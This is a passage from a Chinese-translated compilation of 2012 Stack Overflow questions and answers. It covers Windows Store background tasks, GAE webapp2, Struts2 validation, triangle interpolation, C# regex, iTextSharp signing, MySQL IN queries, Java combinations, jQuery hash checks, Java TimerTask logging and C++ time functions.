根据文档（请参阅[此处](http://msdn.microsoft.com/en-us/library/windows/apps/hh977046.aspx)和[此处](http://msdn.microsoft.com/en-us/library/windows/apps/jj160504.aspx)），没有办法比每 15 分钟更频繁地安排它。但是，您的问题意味着您已经知道这一点。

我认为不会有可用的解决方法，即使您找到了解决方法，我也很确定这将成为您的应用被商店拒绝的理由。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:56:15.203

您可以采用的一种理论方法（我没有尝试过，也没有尝试研究它是否可行）是有 15 个单独的后台任务，每分钟一个。

根据 Windows 处理启动后台任务的方式，您可以尝试安排 15 个单独的任务，在它们启动之前有 15 个单独的延迟，或者同时运行 15 个任务，其中有不同的`Thread.Sleep()`延迟。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-25T22:07:20.120

如果您的评论表明它是供个人使用的，那么该应用程序听起来更像是一个桌面应用程序。

但是，您也可以将应用程序后端作为 Windows 服务或普通的 win32 应用程序，然后为漂亮的前端创建一个 Windows 商店应用程序，该应用程序通过 localhost http 获取其信息。

# google-app-engine - 最新 1.7.4 python SDK 中的 webapp2 2.5.2 抛出 AssertionError: WSGIApplication global variable is not set

> ID：13916381
> 
> 赞同：1
> 
> 时间：2012-12-17T14:49:59.780
> 
> 标签：google-app-engine

刚升级到最新的 1.7.4 GAE python SDK，发现核心 webapp2 库是静默的（[发行说明](http://code.google.com/p/googleappengine/wiki/SdkReleaseNotes#Version_1.7.4_-_December_13,_2012)中没有提到升级到 2.5.2 版本。这个版本包含[向后不兼容的变化](http://code.google.com/p/webapp-improved/source/detail?r=d962ac4625ce3c43a3e59fd7fc07daf8d7b7c46a)。

在某些情况下，它会阻止应用程序以如下错误启动：

```
File "/usr/local/src/gae/google_appengine/lib/webapp2/webapp2_extras/jinja2.py", line 209, in get_jinja2
app = app or webapp2.get_app()
File "/usr/local/src/gae/google_appengine/lib/webapp2/webapp2.py", line 1705, in get_app
assert getattr(_local, 'app', None) is not None, _get_app_error
AssertionError: WSGIApplication global variable is not set. 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T11:00:28.523

如果库是静默升级的，那是因为您在 app.yaml 中使用“最新”作为版本。如果您不想更改版本，请指定版本号。此行为记录在[https://developers.google.com/appengine/docs/python/config/appconfig#Configuring_Libraries](https://developers.google.com/appengine/docs/python/config/appconfig#Configuring_Libraries)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T14:49:59.780

来自[最新 1.7.4 GAE python SDK 中 webapp2 2.5.2 升级的修复](http://www.cliws.com/e/XHeDBLl8tNvcn9Ip67PakQ/)：

如果您遇到相同的错误，请恢复[上述变更集](http://code.google.com/p/webapp-improved/source/detail?r=d962ac4625ce3c43a3e59fd7fc07daf8d7b7c46a)`app.set_globals(app=app)`或在应用初始化后添加类似内容。

# java - Struts2 xml验证不起作用

> ID：13916385
> 
> 赞同：3
> 
> 时间：2012-12-17T14:50:16.197
> 
> 标签：java, forms, struts2, tags

这是我的 Register-validation.xml

```
<!DOCTYPE validators PUBLIC
"-//OpenSymphony Group//XWork Validator 1.0.2//EN"
"http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd">
<validators>

    <validator type="requiredstring">
        <param name="fieldname">userBean.username</param>
        <message>User name is required.</message>
    </validator>

    <validator type="required">
        <param name="fieldname">profileBean.Age</param>
        <message>Age is required.</message>
    </validator>

</validators> 
```

这是我的表格。

```
<s:form action="register">

        <label>UserName</label>
        <s:textfield cssClass="formfield" name="userBean.username"
            label="User Name" />
        <br />
        <label>Password</label>
        <s:password cssClass="formfield" name="userBean.password"
            label="Password" />
        <br />
        <label>First Name</label>
        <s:textfield cssClass="formfield" name="profileBean.firstName"
            label="First Name" />
        <br />
        <label>Last Name</label>
        <s:textfield cssClass="formfield" name="profileBean.lastName"
            label="Last Name" />
        <br />
        <label>Age</label>
        <s:textfield cssClass="formfield" name="profileBean.age" label="Age" />
        <s:submit />
    </s:form> 
```

即使我没有输入用户名和年龄的值，表单仍然会继续显示在成功页面中。为什么它不工作？

**编辑**

```
struts.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE struts PUBLIC
    "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"
    "http://struts.apache.org/dtds/struts-2.0.dtd">

<struts>
    <constant name="struts.devMode" value="false" />
    <constant name="struts.ui.theme" value="simple" />

    <package name="basicstruts2" namespace="/Welcome" extends="struts-default">
        <action name="index">
            <result>WEB-INF/index.jsp</result>
        </action>

        <action name="HelloWorld" class="actions.HelloWorldAction"
            method="execute">
            <result name="success">/HelloWorld.jsp</result>
        </action>
    </package>

    <package name="Registration" namespace="/" extends="struts-default">
        <action name="register" class="actions.Register"
            method="execute">
            <result name="success">/thankyou.jsp</result>
        </action>
    </package>
</struts> 
```

配置文件豆

```
package model;

public class Profile {
    private String firstName;
    private String lastName;
    private int age;

    public String getFirstName() {
        return firstName;
    }
    public void setFirstName(String firstName) {
        this.firstName = firstName;
    }
    public String getLastName() {
        return lastName;
    }
    public void setLastName(String lastName) {
        this.lastName = lastName;
    }
    public int getAge() {
        return age;
    }
    public void setAge(int age) {
        this.age = age;
    }

} 
```

和用户 Bean

```
package model;

public class User {
    private String username;
    private String password;
    private int accountType;//Admin  - 0; User - 1;
    private Profile profile;

    public User(){
        accountType = 1;
    }

    public String getUsername() {
        return username;
    }

    public void setUsername(String username) {
        this.username = username;
    }

    public String getPassword() {
        return password;
    }
    public void setPassword(String password) {
        this.password = password;
    }
    public int getAccountType() {
        return accountType;
    }
    public void setAccountType(int accountType) {
        this.accountType = accountType;
    }
    public Profile getProfile() {
        return profile;
    }

    public void setProfile(Profile profile) {
        this.profile = profile;
    }

} 
```

注册动作

```
public class Register extends ActionSupport  implements ServletRequestAware{

    public String execute(){

        userBean.setProfile(getProfileBean());
        return "success";
    }

    private User userBean;
    private Profile profileBean;
    HttpServletRequest request;

    public User getUserBean() {
        return userBean;
    }

    public void setUserBean(User userBean) {
        this.userBean = userBean;
    }

    public Profile getProfileBean() {
        return profileBean;
    }

    public void setProfileBean(Profile profileBean) {
        this.profileBean = profileBean;
    }

    public void setServletRequest(HttpServletRequest request) {
        this.request = request;
    }

    public HttpServletRequest getServletRequest() {
        return this.request;
    }
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-18T04:31:31.280

我试图运行你的代码。您的错误是您需要提供一个名为`input`. 的结果，如果验证失败，将查找此结果。

```
<package name="Registration" namespace="/" extends="struts-default">
        <action name="register" class="actions.Register"
            method="execute">
          <result name ="input">erropage.jsp</result>  
          <result name="success">/thankyou.jsp</result>
        </action>
    </package> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-17T16:39:14.057

在您的 Register-validation.xml 文件中，您可以更改 dtd 定义：

```
<!DOCTYPE validators PUBLIC
"-//OpenSymphony Group//XWork Validator 1.0.2//EN"
"http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd"> 
```

到

```
<!DOCTYPE validators PUBLIC "-//Apache Struts//XWork Validator 1.0.3//EN"
    "http://struts.apache.org/dtds/xwork-validator-1.0.3.dtd"> 
```

这样您的 Register-validation.xml 看起来像：

```
<!DOCTYPE validators PUBLIC "-//Apache Struts//XWork Validator 1.0.3//EN"
    "http://struts.apache.org/dtds/xwork-validator-1.0.3.dtd">
<validators>

    <validator type="requiredstring">
        <param name="fieldname">userBean.username</param>
        <message>User name is required.</message>
    </validator>

    <validator type="required">
        <param name="fieldname">profileBean.Age</param>
        <message>Age is required.</message>
    </validator>

</validators> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-17T15:02:12.333

我像这样使用 XML 验证（不同的语法）：

```
 <validators>
      <field name="profileBean.age">
          <field-validator type="required">
              <message><![CDATA[ Age is required ]]></message>
          </field-validator>
      </field>

      <field name="userBean.username">
          <field-validator type="requiredstring">
              <message><![CDATA[ Username is required ]]></message>
          </field-validator>
      </field>
  </validators> 
```

尝试一下。

PS：我在这里写了一些关于这个的**[东西](http://andrealigios.blogspot.it/2012/06/struts-2-struts-2-xml-validation.html)**。

编辑：

尝试改变这个

```
<s:form action="register"> 
```

对此

```
<s:form action="/register"> 
```

（或最终到`<s:form action="register" namespace="/">`）

包括命名空间。您在对 AleksandrM 的回答的评论中报告的错误是告诉您命名空间被搞砸了......（考虑一下，您在“/Welcome”上，正在查找位于“/”中的操作而没有指定命名空间...... .这可能会触发一些绕过验证文件的查找机制，只找到动作）

我希望是这样，我已经没有想法了:)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-17T17:40:46.900

您正在使用非字段验证器，并且字段名称的参数必须`fieldName`代替`fieldname`. 顺便说一句，最好使用字段验证器语法。

```
<field name="userBean.username">
  <field-validator type="requiredstring">
    <message>User name is required.</message>
  </field-validator>
</field> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-08-01T07:48:07.567

我有同样的问题。我解决了它，将 actionClass-validation.xml 放在我的 actionClass.java 所在的同一文件夹下。

# c# - 求三角形中一点的 Z 值

> ID：13916387
> 
> 赞同：2
> 
> 时间：2012-12-17T14:50:24.730
> 
> 标签：c#, math

我查看了堆栈溢出以尝试找到解决方案，并发现了一些确实有帮助但仍然不太确定如何解决我的问题的事情，或者我只是错过了一些非常明显的事情！

如果我有 3 个点定义一个三角形，每个点都有一个 XYZ，然后我有一个位于三角形内的点 P，我只有点 P 的 X 和 Y，我该如何找到 Z P 点的值？

我看过三角测量和重心坐标之类的东西，但我不太确定它们是否适合解决方案。

我正在尝试在 C# 中实现这一点，如果需要可以提供更多示例

请提供任何帮助！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T15:08:34.487

你追求的公式是

```
z = (z3(x-x1)(y-y2) + z1(x-x2)(y-y3) + z2(x-x3)(y-y1) - z2(x-x1)(y-y3) - z3(x-x2)(y-y1) - z1(x-x3)(y-y2))
  / (  (x-x1)(y-y2) +   (x-x2)(y-y3) +   (x-x3)(y-y1) -   (x-x1)(y-y3) -   (x-x2)(y-y1) -   (x-x3)(y-y2)) 
```

我认为。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-17T14:53:03.207

三点不仅可以确定一个三角形，还可以确定一个平面。

首先[找到通过这三个点的平面](http://en.wikipedia.org/wiki/Plane_%28geometry%29#Defining_a_plane_through_three_points)，然后使用平面方程求解 P 的 z 值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-17T14:53:23.980

您的 X,Y 与顶点的 X,Y,Z 位于同一空间 -从 3 个点[找到平面方程](http://keisan.casio.com/has10/SpecExec.cgi?id=system/2006/1223596129)，然后替换给定的 X,Y 并求解 Z。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-17T14:53:49.160

您知道要查找的点的 3 个值中的 2 个。您可以简单地使用三角形的公式（并将其反转）来找到您的 Z 值（也许使用投影矩阵；））：

[http://en.wikipedia.org/wiki/Triangle#Further_formulas_for_general_Euclidean_triangles](http://en.wikipedia.org/wiki/Triangle#Further_formulas_for_general_Euclidean_triangles)

# c# - 为什么这个正则表达式匹配额外的字段？

> ID：13916390
> 
> 赞同：1
> 
> 时间：2012-12-17T14:50:44.967
> 
> 标签：c#, regex, expression, match

第一次发帖，老用户。我不明白为什么这个正则表达式的数据在它应该失败时会通过。快速概述是我有一个带有管道分隔数据的文本文件。我一次阅读每一行，并与正则表达式进行比较以判断通过/失败。

这是有问题的数据：

```
|A|00032004|00032004|25 S Kings Highway||Cape Giradeau|MO|63701|345800886888|0000254575|091091|RGT Foods, Inc.|1|345800886888|1|345800886888|1|601103061404806|1|003241699917|0|000000000000|0|000000000000|0|000000000000|0|000000000000|
|A|00032005|00032005|1009 Kings Hwy||Rolla |MO|65401|345800885880|0000254564||RGT Foods, Inc.|1|345800885880|1|345800885880|1|601103061404798|1|003241699925|0|000000000000|0|000000000000|0|000000000000|0|000000000000| 
```

以下是基本分类：|D、U 或 A|ID#|ID#|St Add1|St Add2|City|ST|Zip|#|#|Name|bool|#|bool|#|bool|#|bool |#|bool|#|bool|#|bool|#|bool|#|

这是我的正则表达式（警告：它有点长）：

```
^[\|]{1}[DUA]{1}[\|]{1}[0-9,A-Z]{8}[\|]{1}[0-9,A-Z]{8}[\|]{1}.{0,25}[\|]{1}.{0,25}[\|]{1}.{0,25}[\|]{1}[A-Z,a-z]{2}[\|]{1}[0-9]{5}[\|]{1}[A-Z,a-z,0-9]{12}[\|]{1}[A-Z,a-z,0-9]{10}[\|]{1}.{0,25}[\|]{1}[0,1]{1}[\|]{1}[0-9]{12}[\|]{1}[0,1]{1}[\|]{1}[0-9]{12}[\|]{1}[0,1]{1}[\|]{1}[0-9]{15}[\|]{1}[0,1]{1}[\|]{1}[0-9]{12}[\|]{1}[0,1]{1}[\|]{1}[0-9]{12}[\|]{1}[0,1]{1}[\|]{1}[0-9]{12}[\|]{1}[0,1]{1}[\|]{1}[0-9]{12}[\|]{1}[0,1]{1}[\|]{1}[0-9]{12}[\|]{1} 
```

这是我的正则表达式函数：

```
//Compare the entire line at once
public static bool MatchCCRegEx(string spLine)
{
    try
    {
        Regex CCLineCheck = new Regex(
                Properties.Settings.Default.CCRegExValidationString);
        Match CCLineMatch = CCLineCheck.Match(spLine);

        if (CCLineMatch.Success)
            return true;
        else
            return false;
    }
    catch (Exception RegExCheckExc)
    {
        WELogger.LogEvent("3", 
            "Error running RegEx check on this line:\r\n" 
            + spLine + "\r\n" + RegExCheckExc.ToString());

        Environment.Exit(9);
        return false;
    }
} 
```

我给出的示例数据应该失败，因为在 # 和 Name 之间有一个值为 091091 的额外字段。第二行也应该因为额外字段而失败（但该字段为空）。我已经盯着正则表达式看了好几个小时，因为在我看来，“#|#|Name|bool”中的 091091 会被输入名称并通过，但是“RGT Foods, Inc.” 不应该作为 0 或 1 传递...但是两行都通过正则表达式，我做错了什么？

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-17T14:58:09.730

这是一个匹配，因为`.{0,25}`不仅匹配，`RGT Foods, Inc.`而且匹配`091091|`它之前的。

如果您知道您的“免费”字段不包含任何管道，请替换`.{0,25}`为`[^|]{0,25}`. （“零到 25 个非竖线字符”。）

此外，为了便于阅读，请注意

*   `[\|]`可以写成`[|]`或`\|`。
*   `{1}`可以完全移除；默认为“匹配一次”。
*   `[A-Z,a-z,0-9]`匹配 AZ、az、0-9*和逗号*。你可能的意思是`[A-Za-z0-9]`。同样`[0,1]`应该是`[01]`和`[0-9,A-Z]`应该是`[0-9A-Z]`。

不过，老实说，如果您知道您的自由字段不能包含管道，我会`String.Split`在管道上单独验证每个字段。那个正则表达式是一场噩梦。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T14:58:20.200

问题是您允许`|`作为分隔符之间匹配的一部分。你可能不想这样做。此外，您可以减少大量多余的牙套，因为这`{1}`是不必要的。您可能也不想允许逗号：

```
^\|[DUA]\|[0-9A-Z]{8}\|[0-9A-Z]{8}\|[^|]{0,25}\|[^|]{0,25}\|[^|]{0,25}\|[A-Za-z]{2}\|[0-9]{5}\|[A-Za-z0-9]{12}\|[A-Za-z0-9]{10}\|[^|]{0,25}\|[01]\|[0-9]{12}\|[01]\|[0-9]{12}\|[01]\|[0-9]{15}\|[01]\|[0-9]{12}\|[01]\|[0-9]{12}\|[01]\|[0-9]{12}\|[01]\|[0-9]{12}\|[01]\|[0-9]{12}\| 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-17T14:57:23.680

A`.{0,25}`匹配任何内容（长度为 0-25），*包括* `|`. 尝试 a`[^\|]{0,25}`排除`|`s。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-17T15:00:09.777

我建议不要使用正则表达式来解析分隔文件，而是使用为此任务构建的库。

一个流行的选项是[FileHelpers](http://filehelpers.sourceforge.net/)，它`Microsoft.VisualBasic.FileIO`具有为此而设计的[TextFieldParser](http://msdn.microsoft.com/en-us/library/microsoft.visualbasic.fileio.textfieldparser.aspx)类。

# c# - 具有多个签名和文件附件的 iTextSharp

> ID：13916394
> 
> 赞同：0
> 
> 时间：2012-12-17T14:51:00.793
> 
> 标签：c#, pdf, certificate, itextsharp

我有一个我认为对于女巫来说是一个不寻常的问题，我找不到解决方案。我正在使用 iTextSharp 使用多个数字证书签署 PDF 文档。到目前为止，一切都很好。一切正常。现在，我的客户希望能够在每次有人签署文件时将文本消息附加到签名中。我考虑过使用位置或原因字段来添加文本，但这些字段不够大。有没有办法将文件附加到 PDF 文档而不会使以前的签名失效？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T18:15:31.667

将文件附件添加到 PDF 文件将（根据 Adob​​e Acrobat/Reader）破坏现有签名，因为添加附件不是任何类型签名的允许操作。

但是，如果您使用的签名允许填写表单，您可以使用表单域。如果您可以这样做，请查看[PDF 文档的数字签名，](http://itextpdf.com/book/digitalsignatures) Bruno Lowagie（iText 软件）的白皮书，尤其是第 2.5 节“PDF 中的签名和工作流程”。

虽然代码示例是用 Java 编写的，但作者相信 Java 示例对于使用 iTextSharp 而不是 iText 的 C# 开发人员来说也很容易理解。

[可以从iTextSharp SVN 存储库](http://sourceforge.net/p/itextsharp/code/502/tree/tutorial/signatures/)中检出 C# 化的示例。

# mysql - 检查多个列的一个值

> ID：13916400
> 
> 赞同：50
> 
> 时间：2012-12-17T14:51:15.193
> 
> 标签：mysql, sql, select, query-optimization

我有一个表，其中包含这样的列，例如：

```
id,col1,col2,col3,col4 
```

现在，我想检查是否`ANY`有`col1, col2, col3, col4`传入的值。

很长的路要走..

```
SELECT * FROM table WHERE (col1 = 123 OR col2 = 123 OR col3 = 123 OR col4 = 123); 
```

我想这是相反的版本`IN`。

有没有更简单的方法来做我想做的事？

* * *

## 回答 #1

> 赞同：128
> 
> 时间：2012-12-17T14:52:07.060

您可以使用`IN`谓词，如下所示：

```
SELECT * FROM table WHERE 123 IN(col1, col2, col3, col4); 
```

## [SQL 小提琴演示](http://www.sqlfiddle.com/#!2/ad038/1)

* * *

> 这是IN的相反版本。

**不，不是**，这与`OR`您在问题中使用 s 的方式相同。

* * *

## 为了澄清这一点：

谓词`IN`或集合成员资格定义为¹：

![在此处输入图像描述](../Images/e99a0599985db541d49dabddd486dce8.png)

其中`Value Expression`可以是²：

![在此处输入图像描述](../Images/d25cb29d78ab491039ec027b29ebf459.png)

因此，使用值表达式`123`（即文字）以这种方式执行此操作是可以的。

* * *

^(1, 2:^(图片来自: [SQL Queries for Mere Mortals(R): A Hands-On Guide to Data Manipulation in SQL](https://rads.stackoverflow.com/amzn/click/com/0201433362)))

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-06-29T15:33:14.167

您可以执行以下操作：（注意：假设列是数值。并且，如果连接的值创建您要查找的字符序列，请使用分隔符来区分列值。管道（|）是这里的分隔符例子。）

```
SELECT [ID]
    ,[Col1]
    ,[Col2]
    ,[Col3]
    ,[Col4]
FROM [Table1]
WHERE '123' IN (
    CAST([Col1] AS VARCHAR) + '|'
    + CAST([Col2] AS VARCHAR) + '|'
    + CAST([Col3] AS VARCHAR) + '|'
    + CAST([Col4] AS VARCHAR) + '|'
) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-07-01T13:19:46.610

我有一个类似的问题并以这种方式解决：`SELECT * FROM table WHERE col1 OR col2 IN(SELECT xid FROM tablex WHERE somecol = 3)`

不确定这是否是“最好的方法”，但它对我有用。

**想法？**

# java - 对象数组的每个组合

> ID：13916401
> 
> 赞同：3
> 
> 时间：2012-12-17T14:51:20.093
> 
> 标签：java, recursion, combinations

基本上，我有一个包含 25 个不同人的数组，我需要选择其中的 5 个人，并有可能的每一个组合，而不使用同一个人的重复。

我能想到的唯一合乎逻辑的方法是使用 5 个 for 循环并检查 person 是否已被使用，尽管这似乎可能有更好的涉及递归的方法。

如果有人可以提供帮助，我将不胜感激。

这是我班级的一个例子；

```
public class Calculator {

    final Person[] people = new Person[25]; //Pretend we have filled in this info already

    public List<Group> generateList()
    {
        final List<Group> possible = new ArrayList<>();
        for (int a = 0; a < 25; a++)
        {
            for (int b = 0; b < 25; b++)
            {
                for (int c = 0; c < 25; c++)
                {
                    for (int d = 0; d < 25; d++)
                    {
                        for (int e = 0; e < 25; e++)
                        {
                            final Group next = new Group();
                            next.set = new Person[] {
                                people[a],
                                people[b],
                                people[c],
                                people[d],
                                people[e]
                            };
                            possible.add(next);
                        }
                    }
                }
            }
        }
        return possible;
    }

    class Group {

        Person[] set = new Person[5];

    }

    class Person {

        String name;
        int age;

    }

} 
```

但是，我不确定执行此操作的最佳方法，以及是否可以得到所有组合。我也知道这里没有重复检查，我会通过检查来做到这一点；

如果（b == a）继续；

等等。

我将不胜感激任何帮助。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-17T14:53:39.950

一种可能性是使用组合库，例如：[http](http://code.google.com/p/combinatoricslib/) ://code.google.com/p/combinatoricslib/ 。

```
// Create the initial vector
   ICombinatoricsVector<String> initialVector = Factory.createVector(
      new String[] { "red", "black", "white", "green", "blue" } );

   // Create a simple combination generator to generate 3-combinations of the initial vector
   Generator<String> gen = Factory.createSimpleCombinationGenerator(initialVector, 3);

   // Print all possible combinations
   for (ICombinatoricsVector<String> combination : gen) {
      System.out.println(combination);
   } 
```

该示例来自项目页面（请参阅链接）。将它转移到您的用例应该很容易。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-17T15:10:06.137

有很多选择。

(1)

你可以通过使用来改进你的算法

```
for a = 0 to 25 
  for b = a+1 to 25  // use ascending-order rule 
    for c = b+1 to 25 
```

等 - 这消除了重复检查，利用问题的阶乘性质

(2)

您也可以将它们实现为对整个 N^R 个项目的单个 for 循环（如果您从 N 中选择了 R 个项目），并丢弃不是完全升序的排列。如果您事先不了解 R，这很好。想象一下你在以 N 为底数

```
for i = 0 to N^R // count in base N
  for digit = 0 to R 
    value[digit] = (i/N^digit) mod (N^(digit+1)) // extract the required digit
    if digit>0 && value[digit]<value[digit-1], SKIP 
```

换句话说，您按顺序计算这些 R 索引。

(3)

最后一个选项，它的编码时间更长，但对于大 R 和 N 更有效，是使用一组索引：

```
// i is an array size R, with items ranging from 0 to N
i = int[]{ 0, 1, 2, 3, 4 }; // each is an index of the items in N

while !finished
    j=0; // index to start incrementing at
    i[j] ++; 
```

然后，如果您超过`N`任何索引，增加`j`，增加`i[j]`，并将所有设置`i[k<j]`为`[0 1 2 ... j-1]`，然后重新开始计数！这在所有组合中最有效地循环。

# jquery - jQuery document.location.href if、else if 和 else

> ID：13916405
> 
> 赞同：0
> 
> 时间：2012-12-17T14:51:29.627
> 
> 标签：jquery, jquery-ui

我知道**如果**在 jQuery 上也可以工作，那么这段代码的问题出在哪里：

```
if (document.location.href.indexOf('#1')) {
    $(".products li").fadeIn();
}
else if (document.location.href === '#2') {
    $(".products li").fadeOut();
    $(".products li.2").stop(true,true).fadeIn(200);
}
else if (document.location.href === '#3') {
    $(".products li").fadeOut();
    $(".products li.3").stop(true,true).fadeIn(200);
}
else if (document.location.href === '#4') {
    $(".products li").fadeOut();
    $(".products li.4").stop(true,true).fadeIn(200);
}
else if (document.location.href === '#5') {
    $(".products li").fadeOut();
    $(".products li.5").stop(true,true).fadeIn(200);
}
else if (document.location.href === '#6') {
    $(".products li").fadeOut();
    $(".products li.6").stop(true,true).fadeIn(200);
}
else {
    $(".products li").fadeIn();
} 
```

如果我只输入**if**而不是**else if**它有效但它不正确。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T14:53:48.793

`document.location.href.indexOf('#1')` [如果没有找到匹配，则](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/String/indexOf)表达式将返回 -1，如果在字符串的开头匹配则返回零。由于您测试错误值，因此您永远不会得到错误结果（-1 评估为 Boolean `true`）。你应该写：

```
if (document.location.href.indexOf('#1')>-1) { 
```

但是由于您似乎在比较哈希，所以我们直接做那些（并在我们处理时使用[正确的）：](https://developer.mozilla.org/en-US/docs/DOM/document.location) `window.location`

```
if (window.location.hash == '#1') {
    // ...
} else if (window.location.hash == '#2') {
    // etc. 
```

也就是说，在您的情况下，我们可以完全`if/else`通过解析该哈希字符串来完成此操作：

```
var hash = window.location.hash.substr(1); // remove leading #
if (hash) {
    $(".products li").fadeOut();
    $(".products li."+hash).stop(true,true).fadeIn(200);
} else {
    $(".products li").fadeIn();
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T14:59:36.753

看起来你想检查 url 中的哈希值，所以你为什么不使用

`location.hash`

因为`location.href`包括整个网址

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-17T14:55:12.573

首先，如果您使用的是 indexOf：

```
if (document.location.href.indexOf('#1')) 
```

但在其他情况下，如果您不使用它，而是比较 href.location 本身：

```
else if (document.location.href === '#2') 
```

# java - TimerTask在不执行的情况下生成错误

> ID：13916410
> 
> 赞同：0
> 
> 时间：2012-12-17T14:51:49.417
> 
> 标签：java, multithreading, timer, timertask

我对标题感到抱歉，但我不确定如何描述这个问题。我有一个带有扩展 TimerTask 的类的 SingletonBean。关键是，当应用程序启动时，它开始循环运行一组计划的后台任务。乍一看一切正常，Timer() 执行 run() 方法，并且计划的作业每 120 秒完美执行一次。

在 run() 内部，我有一个从 AWS DynamoDB 获取信息列表的方法。

```
List<SiteObj> sites = storedDynamoQueries.scanSite("uid"); 
```

这再次完美运行，并且正如我所期望的那样，我可以在该方法上放置一个中断，并在它执行时每 120 秒暂停一次，等待我跨过它。

现在解决问题！如上所述，定时器设置为每 120 秒执行一次。但是每 120 秒但偏移 60 秒。我收到如下错误：

```
SEVERE: Error wih Dynamo Site Scan
java.lang.NullPointerException
    at org.apache.log4j.LogManager.getLogger(LogManager.java:179)
    at org.apache.log4j.Logger.getLogger(Logger.java:94)
    at org.apache.commons.logging.impl.Log4JLogger.getLogger(Log4JLogger.java:289)
    at org.apache.commons.logging.impl.Log4JLogger.debug(Log4JLogger.java:177)
    at com.amazonaws.auth.AWS4Signer.sign(AWS4Signer.java:119)
    at com.amazonaws.http.AmazonHttpClient.executeHelper(AmazonHttpClient.java:239)
    at com.amazonaws.http.AmazonHttpClient.execute(AmazonHttpClient.java:165)
    at com.amazonaws.services.dynamodb.AmazonDynamoDBClient.invoke(AmazonDynamoDBClient.java:985)
    at com.amazonaws.services.dynamodb.AmazonDynamoDBClient.scan(AmazonDynamoDBClient.java:560)
    at com.amazonaws.services.dynamodb.datamodeling.DynamoDBMapper.scan(DynamoDBMapper.java:1066)
    at com.amazonaws.services.dynamodb.datamodeling.DynamoDBMapper.scan(DynamoDBMapper.java:1028)
    at tv.tarka.dastraxweb.integration.dynamo.StoredDynamoQueries.scanSite(StoredDynamoQueries.java:1584)
    at tv.tarka.dastraxweb.application.snmp.Scheduler$ScheduledTask.run(Scheduler.java:72)
    at java.util.TimerThread.mainLoop(Timer.java:555)
    at java.util.TimerThread.run(Timer.java:505) 
```

现在这是由与上述相同的方法触发的错误。但是当我尝试调试它时，系统说该类甚至没有被调用！它不会出现在调试器中，也不应该被所有帐户调用，尤其是不会从 run() 的其余部分偏移 60 秒。

无论如何，我怀疑答案与跟踪的最后两行有关。

```
at java.util.TimerThread.mainLoop(Timer.java:555)
at java.util.TimerThread.run(Timer.java:505) 
```

但我不知道是什么原因造成的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T15:10:17.603

这意味着日志库无法获取记录器。检查记录器配置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-05-22T19:11:42.070

看起来要么存在冲突的日志框架实现类，要么缺少 commons-logging.properties 文件。尽管您可以混合调用 log4j、log4j 2、slf4j、commons-logging 等 API，但您包含在依赖项中的类必须兼容。底部有一组使用 log4j 作为实现类集的类，还有另一组使用 log4j 2 作为实现类的类。

见[https://bradleyaross.wordpress.com/2016/05/05/java-logging-frameworks/](https://bradleyaross.wordpress.com/2016/05/05/java-logging-frameworks/)

如果您查看[http://www.github.com/bradleyross/tutorials](http://www.github.com/bradleyross/tutorials)项目中的 tutorials-log4j1 和 tutorials-log4j2 模块，您将看到每个类的设置示例。

如果使用 log4j 1.x 实现类，您将需要一个 log4j.xml 文件，一个 commons-logging.properties 文件，指示消息发送到 log4j 或适当的系统，jar 文件是 commons-logging-1.2.jar log4j-1.2.17.jar log4j-to-slf4j-2.0-beta4.jar

如果使用 log4j 2 实现文件，我使用 log4j2.xml 和 commons-logging-1.2.jar log4j-1.2-api-2.5.jar log4j-api-2.5.jar log4j-core-2.5.jar log4j-slf4j-impl- 2.5.jar（这消除了对 commons-logging.properties 的需要）

请参阅[http://docs.aws.amazon.com/AWSSdkDocsJava/latest/DeveloperGuide/java-dg-logging.html](http://docs.aws.amazon.com/AWSSdkDocsJava/latest/DeveloperGuide/java-dg-logging.html)

两个集合的唯一 jar 文件是 commons-logging-1.2.jar。混合这两组中的任何其他文件都会导致大量问题。（正如我在 IBM 的旧手册中所说的那样，结果是不确定的。）

不再支持 log4j 1.x

# c++ - 应该返回什么 C++ 函数？

> ID：13916412
> 
> 赞同：0
> 
> 时间：2012-12-17T14:51:56.223
> 
> 标签：c++, time-t

我有以下代码片段：

```
 time_t data1 = time(0)+86400; 
 struct tm * data_emprestimo = localtime( & data1 );
 cout << "Hoje: " << data_emprestimo->tm_mday << '/' << (data_emprestimo->tm_mon + 1) << '/' << (data_emprestimo->tm_year + 1900) << endl; 
```

它运作良好。

但我想知道我应该在函数中返回哪种类型来获取 cout 回显并放入变量：struct tm？只是tm？大批？细绳？

我试过这样的事情：

```
struct tm retornaData(int segundosAdd);
            ...
            ...
struct tm retornaData(int segundosAdd){
   return data_emprestimo;
} 
```

但它没有用。

我已经用谷歌搜索了很多！

